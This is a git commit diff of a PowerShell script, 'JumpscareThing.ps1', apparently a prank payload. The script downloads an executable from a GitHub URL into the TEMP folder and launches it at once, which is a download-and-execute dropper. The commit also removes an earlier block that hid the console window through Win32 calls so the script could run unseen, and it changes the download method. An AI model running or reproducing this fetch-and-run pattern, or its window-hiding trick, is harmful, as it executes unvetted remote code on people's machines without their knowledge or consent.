db3e7b503b07ca95b92cd7ca5e1fcb179fd5d124
LordRyan1999 <62319844+LordRyan1999@users.noreply.github.com>
2021-07-02 21:28:49 -0700

    Update JumpscareThing.ps1

--- JumpscareThing.ps1
+++ JumpscareThing.ps1
@@ -1,22 +1,7 @@
-# .Net methods for hiding/showing the console in the background
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-function Hide-Console
-{
-    $consolePtr = [Console.Window]::GetConsoleWindow()
-    #0 hide
-    [Console.Window]::ShowWindow($consolePtr, 0)
-}
-Hide-Console
-
 $url = "https://github.com/LordRyan1999/JumpscareThing/raw/main/JumpscareThing.exe"
 $outpath = "$env:TEMP/JumpscareThing.exe"
-Invoke-WebRequest -Uri $url -OutFile $outpath
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $outpath)
 
 $args = @("Comma","Separated","Arguments")
 Start-Process -Filepath "$env:TEMP/JumpscareThing.exe" -ArgumentList $args
